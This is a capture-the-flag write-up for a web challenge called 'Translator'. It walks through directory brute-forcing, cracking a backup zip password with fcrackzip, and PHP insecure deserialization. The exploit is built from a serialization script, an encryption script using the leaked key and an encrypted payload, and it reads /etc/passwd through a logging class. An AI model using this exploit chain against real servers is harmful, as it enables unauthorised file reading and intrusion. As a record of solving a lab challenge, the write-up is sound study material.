The challenge description:

    "title": "Translator"
    "level": 2
    "description": "The only way to patch a vulnerability is by exposing it first so, Will you can Translator ?."
    "points": 600
    
  I went to [the website](http://35.222.121.58/Translator/), made directory brute force scan, Checked the source code.. nothing seems to be important..
  
  I checked the request and response, but still nothing important
  
  I returned to see what the directory brute force found and it got two files that shined with some hope to find something important
  
  ![image 1](https://imgur.com/uDx6SiR.png)

  
  Both directories gave 403 unauthorized response
  
  At least maybe another brute force on them could reveal something.. and yes it did
  
  We found a zip file inside backup directory
  
  ![image 2](https://imgur.com/XBev9nz.png)

  
  Downloaded the file and tried to unzip it but it requires password, peace of cake
  
  Running a small program to brute force the password was enough
  
  ```fcrackzip -v -u -D -p backup.zip rockyou.txt```
  
  ![image 3](https://imgur.com/PtpMSmw.png)
  
  The password: ```kaylaanne```

  
  Unzipped the file and it contained the source code of the index.php page

```
<?php

function encryptString($plaintext, $password) {
//This is s3cr3t
}


function decryptString($ciphertext, $password) {
    $ciphertext = base64_decode($ciphertext);
    if (!hash_equals(hash_hmac('sha256', substr($ciphertext, 48).substr($ciphertext, 0, 16), hash('sha256', $password, true), true), substr($ciphertext, 16, 32))) return null;
    return openssl_decrypt(substr($ciphertext, 48), "AES-256-CBC", hash('sha256', $password, true), OPENSSL_RAW_DATA, substr($ciphertext, 0, 16));
}

//$EncString = encryptString("aaaaaaaaaaaaaaaaaaaaa", "vmUeu7D9bzE5JmNE"); output:SElIT1dBUkVZT1VCUk8hIdk8ZHn/lvhO9Vammhqvg8N6OlV2KOX3uRiQ7gsn8ZXuvE4UUPOK9Q4ZhufvCiyXhAIdJxY+22Rt5AgkVy0CDcI=

class ReadListLogs
{
        private $FileName = "/var/log/httpd/access_log";
        private $RowNumber = 1;

    public function __construct()
    {
      echo "__construct";
      $this->ReadSave($this->FileName, $this->RowNumber);
    }

    public function __wakeup()
    {
      $this->ReadSave($this->FileName, $this->RowNumber);
    }

    function ReadSave($FileName,$RowNumber)
        {
        $this->FileName = $FileName;
        $this->RowNumber = $RowNumber;
        $array = explode("\n", file_get_contents($FileName));
        $reversed = array_reverse($array);
        $File_Contnet = $reversed[$RowNumber];
              $stringxx = bin2hex(random_bytes(18));
        file_put_contents(__DIR__.'/logs/'.$stringxx.".txt", $File_Contnet);
            echo "End $stringxx";
        }
}



$data = json_decode(file_get_contents('php://input'));
$DecryptVal =  strval(decryptString($data->user,"vmUeu7D9bzE5JmNE"));
unserialize($DecryptVal);

?>
```
  Taking a look at what the code do
  1. Unreaveled encryption function that takes plain text and key
  2. Revealed decrypting function that takes cipher text and key
  3. A sample of the encrypting
  
  After them there's a class which contains:
  
  1. Two variables $FileName and $RowNumber
  2. __construct and __wakeup php magic methods, these are method that run without calling them when some action happens you can read about them ![here}(https://www.php.net/manual/en/language.oop5.magic.php)
  3. A function to read files and store the output in file with random name in logs directory
  4. Echoes the file name

  And the last portion of the code does the following:

  1. Gets the data from the request
  2. Decode the json formatted data
  3. Store the data to variable named $data
  4. Decrypting the parameter user in variable data with the decrypting function
  5. Storing the decrypted cipher to a variable named $DecryptVal
  6. Unserializing $DecryptVal

  It's clear since the code has magic methods and unserializing user data that it'll be php insecure deserialization ( aka php object injection )

  Ok let's take it step by step

  ### 1. serializing
  
  Since the data is unserialized we need to supply serialize 
  
  I made a small php script to serialize the data and make object of the same class with the same variables but changing thier values
```
<?php
class ReadListLogs
{
        public function __construct()
        {
                $this->filename="/etc/passwd";
                $this->RowNumber = 1;
        }
}
$obj = new ReadListLogs();
echo serialize($obj);
echo "\n";
?>
```
  ![image 4](https://imgur.com/TiOTXI1.png)
  
  ```O:12:"O:12:"ReadListLogs":2:{s:8:"FileName";s:11:"/etc/passwd";s:9:"RowNumber";i:1;}```
  
  And we got the serialized payload..


  ### 2. encrypting
  
  Here was a great problem for me, I thought at first it depended on cryptography, but it seemed at last it's OSINT
  
  I searched for a long time for the algorithm until I finally found it [here](https://stackoverflow.com/questions/3422759/php-aes-encrypt-decrypt/56856924#answer-62175221)
  
  Ok now I have the encryption algorithm

```
function encryptString($plaintext, $password) {
    $iv = openssl_random_pseudo_bytes(16);
    $ciphertext = openssl_encrypt($plaintext, "AES-256-CBC", hash('sha256', $password, true), OPENSSL_RAW_DATA, $iv);
    $hmac = hash_hmac('sha256', $ciphertext . $iv, hash('sha256', $password, true), true);
    return base64_encode($iv.$hmac.$ciphertext);
}
```

  I modified it a bit so I can use it in a local web server
```
<?php

$password="vmUeu7D9bzE5JmNE";
$data=json_decode(file_get_contents('php://input'));
$plaintext=$data->user;

function encryptString($plaintext, $password) {
    $iv = openssl_random_pseudo_bytes(16);
    $ciphertext = openssl_encrypt($plaintext, "AES-256-CBC", hash('sha256', $password, true), OPENSSL_RAW_DATA, $iv);
    $hmac = hash_hmac('sha256', $ciphertext . $iv, hash('sha256', $password, true), true);
    return base64_encode($iv.$hmac.$ciphertext);
}

echo encryptString($plaintext,$password);

?>
```
  ![image 5](https://imgur.com/f2fU0IL.png)

  Also try to decrypt it locally with some reflective data added

  ![image 6](https://imgur.com/tr3ZaEg.png)

  Encrypting done



  ### 3. injecting

  The encrypted serialized payload:

  ```NB8zli9U94QIB9lOosT0vaPVSakMB8vc7QTXEmJ4e9x9g4ah84ImLkFSdW1zHba5EEQvLzTNYXHkQocwb7ejsTTnEOU5maOkPW2fnMz6o2LPQZrnxe3rhh5A8Wh2g6pwqC6Nq7ZODfPPdMmfaTVMVh+iklUFeteJL9VOW27yLik=```

  Injecting it into the challenge
  
  ![image 7](https://imgur.com/6y5ikh0.png)

  We got our lucky number for the file: 31771b107da808662fa1

  ![image 8](https://imgur.com/lhpz84I.png)

  Going to [the file](http://35.222.121.58/Translator/logs/31771b107da808662fa1.txt)

  ![https://imgur.com/beS5w18.png](https://imgur.com/beS5w18.png)

  And we got the flag: ```#ASCWG{php_1$_R3a11y_C0Ol_1$_not_1t_?x?:P_1xcxz}```


  Big credits to my teammate Abanob Medhat who participated with me in solving this challenge
